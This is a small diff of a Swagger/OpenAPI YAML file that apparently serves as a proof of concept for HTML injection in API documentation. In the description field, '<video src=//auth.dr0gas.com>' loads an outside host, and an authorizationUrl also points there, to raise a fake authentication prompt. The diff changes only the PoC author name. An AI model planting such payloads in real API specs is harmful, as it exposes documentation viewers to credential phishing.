@@ -5,8 +5,8 @@ securityDefinitions:
     authorizationUrl: http://auth.dr0gas.com
 info:
   version: "0.0.1"
-  title: External Authentication Prompt via HTML Injection (PoC Dr0gas)
-  description: Please Authorize!<video src=//auth.dr0gas.com> | PoC Dr0gas
+  title: External Authentication Prompt via HTML Injection (PoC d0ug)
+  description: Please Authorize!<video src=//auth.dr0gas.com> | PoC d0ug
 paths:
   /:
     get:
